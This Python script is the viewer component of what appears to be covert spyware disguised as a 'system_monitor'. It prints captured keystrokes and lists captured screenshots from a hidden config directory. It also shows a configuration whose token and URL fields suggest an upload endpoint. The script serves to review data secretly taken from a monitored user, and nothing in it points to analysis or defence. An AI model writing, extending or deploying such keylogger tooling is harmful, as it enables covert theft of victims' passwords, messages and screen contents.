"""Dump collected data"""

from pathlib import Path
from datetime import datetime


def dump_keystrokes(log_dir: str = "~/.config/system_monitor/logs"):
    """Display collected keystrokes."""
    log_dir = Path(log_dir).expanduser()
    keystroke_file = log_dir / "keystrokes.txt"
    
    if not keystroke_file.exists():
        print("[!] No keystroke data collected yet")
        return
    
    print("\n=== KEYSTROKE DATA ===\n")
    
    with open(keystroke_file, 'r') as f:
        lines = f.readlines()
        print(f"Total keystrokes: {len(lines)}\n")
        
        # Show last 50 keystrokes
        if len(lines) > 50:
            print("(Showing last 50 keystrokes)\n")
            for line in lines[-50:]:
                print(line.rstrip())
        else:
            for line in lines:
                print(line.rstrip())


def dump_screenshots(log_dir: str = "~/.config/system_monitor/logs"):
    """Display screenshot info."""
    screenshot_dir = Path(log_dir).expanduser() / "screenshots"
    
    if not screenshot_dir.exists():
        print("[!] No screenshots collected")
        return
    
    print("\n=== SCREENSHOTS ===\n")
    
    screenshots = sorted(screenshot_dir.glob("*.png"))
    print(f"Total screenshots: {len(screenshots)}\n")
    
    for screenshot in screenshots:
        size_kb = screenshot.stat().st_size / 1024
        print(f"  {screenshot.name} ({size_kb:.1f}KB)")


def dump_config(config_file: str = "~/.config/system_monitor/config.json"):
    """Display configuration."""
    import json
    
    config_path = Path(config_file).expanduser()
    
    if not config_path.exists():
        print("[!] No configuration found")
        return
    
    print("\n=== CONFIGURATION ===\n")
    
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
            for key, value in config.items():
                if 'token' in key.lower() or 'url' in key.lower():
                    # Hide sensitive data
                    value = f"{str(value)[:20]}..." if value else "Not set"
                print(f"  {key}: {value}")
    except Exception as e:
        print(f"[!] Error reading config: {e}")


def main():
    import sys
    
    if len(sys.argv) > 1:
        command = sys.argv[1]
        
        if command == "keys":
            dump_keystrokes()
        elif command == "screenshots":
            dump_screenshots()
        elif command == "config":
            dump_config()
        elif command == "all":
            dump_keystrokes()
            dump_screenshots()
            dump_config()
        else:
            print(f"Unknown command: {command}")
    else:
        print("""
Usage: python dump.py [command]

Commands:
  keys           Show collected keystrokes
  screenshots    Show collected screenshots
  config         Show configuration
  all            Show everything

Examples:
  python dump.py keys
  python dump.py all
        """)


if __name__ == "__main__":
    main()
